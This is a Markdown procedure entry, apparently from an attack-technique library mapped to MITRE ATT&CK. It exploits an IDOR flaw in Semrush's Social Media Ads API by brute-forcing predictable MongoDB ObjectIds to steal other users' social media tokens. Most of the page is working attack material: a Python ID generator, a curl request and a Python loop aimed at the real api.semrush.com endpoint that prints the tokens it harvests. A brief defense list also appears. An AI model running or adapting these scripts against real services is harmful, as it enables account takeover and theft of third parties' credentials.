---
tags:
  - idor
  - brute-force
  - token-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-fetch-user-token]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:47.699Z'
sub_techniques: []
id: 40c7cb80-6c6b-4789-a019-0c623c704b49
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
---
# Brute-Force-User-IDs-for-Token-Access

## Summary

This procedure exploits IDOR by systematically generating and testing predicted MongoDB ObjectIds against a vulnerable endpoint in Semrush's Social Media Ads service to retrieve unauthorized social media tokens, potentially allowing account takeover on platforms like Facebook.

## Description

Leveraging the analysis of ObjectId predictability, this procedure involves scripting requests to an ID-based API endpoint that lacks proper authorization checks. By varying the incrementing counter and minor timestamp adjustments, an attacker can enumerate user IDs and fetch sensitive tokens. In the Semrush case, this grants access to another user's advertising data and social network controls. Expected outcomes include token exposure, with risks of data modification or propagation. Requires an authenticated session and knowledge of the base ID.

## Requirements

1. Valid authentication token for the target service
2. Base ObjectId from prior analysis
3. Scripting capability (e.g., Python requests or curl loop) for automation
4. Proxy tool (optional) for traffic inspection

## Defense

Defensive measures and detection strategies:

- Enforce server-side authorization verifying user ownership of requested IDs
- Rate-limit ID-based requests to prevent enumeration
- Use non-predictable identifiers and log/monitor brute-force attempts

## Objectives

1. Enumerate valid user IDs through trial requests
2. Extract social media tokens from unauthorized profiles
3. Validate impact by testing token usability (e.g., API calls to social platform)

## Instructions

### Step 1: Generate Predicted IDs

**Context**: Create a range of potential ObjectIds based on the analyzed structure.

Use a script to generate variations:

```python
base_timestamp = "507f1f77"  # From analysis
base_random = "bcf86cd"

for offset in range(-100, 100):  # Timestamp tweaks
    for counter in range(10000):  # Counter range
        ts_adjusted = hex(int(base_timestamp, 16) + offset)[2:].zfill(8)
        id_pred = f"{ts_adjusted}{base_random}{counter:06x}"
        print(id_pred)
```

> This outputs a list of hex IDs for testing, focusing on likely creation times.

### Step 2: Test IDs via API Requests

**Context**: Submit requests to the vulnerable endpoint for each predicted ID to fetch tokens.

Execute [[commands/curl-fetch-user-token]] for manual tests, or loop in script:

```bash
curl -H "Authorization: Bearer YOUR_TOKEN" -X GET "https://api.semrush.com/social-ads/users/507f1f77bcf86cd799439012/token"
```

In Python for automation:

```python
import requests

headers = {"Authorization": "Bearer YOUR_TOKEN"}
url_template = "https://api.semrush.com/social-ads/users/{}/token"

for test_id in predicted_ids:  # From Step 1
    resp = requests.get(url_template.format(test_id), headers=headers)
    if resp.status_code == 200:
        data = resp.json()
        if 'token' in data:
            print(f"Unauthorized token: {data['token']} for ID {test_id}")
            # Stop or continue based on needs
```

> Successful response: JSON with token field; errors for invalid IDs (e.g., 404).

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Account Discovery]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-fetch-user-token]]

## Tools Used


## Tags

- [[idor]]
- [[brute-force]]
